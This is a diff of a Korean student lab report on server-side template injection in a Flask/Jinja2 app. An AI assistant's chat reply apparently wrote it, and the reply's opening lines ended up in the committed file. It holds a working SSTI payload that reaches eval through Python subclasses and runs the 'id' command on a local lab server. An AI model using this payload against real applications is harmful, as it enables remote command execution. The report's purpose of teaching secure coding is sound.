@@ -1,4 +1,17 @@
+좋아, 요청 완벽하게 이해했어!  
+**"보고서용 Markdown 문서를 깔끔하게 정리하고, 캡처 이미지 첨부하는 방법까지"** 알려달라는 거지?
+
+  
+**진짜 제대로 해줄게.**
+
+---
+
+# 📋 최종 보고서용 README.md (예쁘고 완벽한 버전)
+
+```markdown
 # SSTI (Server-Side Template Injection) 취약점 실습 보고서
+
+---
 
 ## 1. 실습 개요
 
@@ -31,4 +44,92 @@
 
 ```bash
 docker compose up --build
-![image](https://github.com/user-attachments/assets/5f373eb5-0024-417c-84fd-953ca1efab9c)
+```
+
+**실행 화면 캡처:**
+
+![docker-compose-up](./images/docker-compose-up.png)
+
+---
+
+### 3.2 웹 브라우저에서 SSTI 테스트
+
+- URL 접근:
+
+```
+http://localhost:8000/?name={{8*7}}
+```
+
+- 결과 화면:
+
+![browser-ssti-test](./images/browser-ssti-test.png)
+
+---
+
+### 3.3 PoC 코드 실행
+
+- `poc.py` 실행:
+
+```bash
+python poc.py
+```
+
+- 출력 결과:
+
+![poc-execution](./images/poc-execution.png)
+
+---
+
+### 3.4 서버의 명령어 실행 결과
+
+- 서버에서 `id` 명령어 결과를 반환:
+
+![id-result](./images/id-result.png)
+
+---
+
+## 4. 취약점 검증 (PoC)
+
+### 4.1 SSTI 공격 페이로드
+
+```jinja2
+{% for c in [].__class__.__base__.__subclasses__() %}
+  {% if c.__name__ == 'catch_warnings' %}
+    {% for b in c.__init__.__globals__.values() %}
+      {% if b.__class__ == {}.__class__ %}
+        {% if 'eval' in b.keys() %}
+          {{ b['eval']('__import__("os").popen("id").read()') }}
+        {% endif %}
+      {% endif %}
+    {% endfor %}
+  {% endif %}
+{% endfor %}
+```
+
+- 해당 페이로드를 통해 서버 내부에서 명령어 실행(`id`)을 성공적으로 수행하였다.
+
+---
+
+## 5. 결과 요약
+
+| 항목 | 결과 |
+|:---|:---|
+| SSTI 취약점 존재 여부 | ✅ 존재 확인 |
+| 명령어 실행 성공 여부 | ✅ 서버 명령어(id) 실행 성공 |
+| PoC 성공 여부 | ✅ 성공적으로 서버 제어 |
+
+---
+
+## 6. GitHub 레포지터리
+
+- 작업 결과 GitHub 레포지터리:  
+[https://github.com/buddle031/secure-coding](https://github.com/buddle031/secure-coding)
+
+---
+
+## 7. 결론
+
+본 실습을 통해 Flask/Jinja2 환경에서 발생 가능한 SSTI 취약점을 직접 검증하고, 서버 측 명령어 실행까지 성공하였다.  
+이를 통해 서비스 개발 시 템플릿 렌더링 과정에서 입력값을 철저히 검증하고, 취약점을 예방하는 보안 조치가 필요함을 확인할 수 있었다.
+
+--- 
